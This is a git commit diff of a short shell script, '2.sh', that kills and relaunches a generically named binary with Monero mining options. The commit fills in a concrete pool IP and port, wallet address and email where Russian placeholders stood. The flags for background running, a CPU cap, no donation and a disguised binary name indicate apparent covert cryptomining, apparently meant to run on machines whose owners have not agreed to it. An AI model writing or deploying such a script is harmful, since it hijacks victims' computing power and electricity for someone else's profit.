6d62a718379996a8125c222627576dfdbc369e1c
JerrySmith322 <64580604+JerrySmith322@users.noreply.github.com>
2020-04-30 02:14:37 -0700

    Update 2.sh

--- 2.sh
+++ 2.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
+defaultsoftwarename -o 95.217.140.39:47222 -u 41fV5u38FYHKL1VzHF7DMxG9PRoydLpn5MLYyVznQDn1FeP1JHKJQzrBuyHrRz11mZ2HrF2wkeW9mY19hTgh7KLu4CjXhpM --pass=x:JerrySmith322@protonmail.com --rig-id=1 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
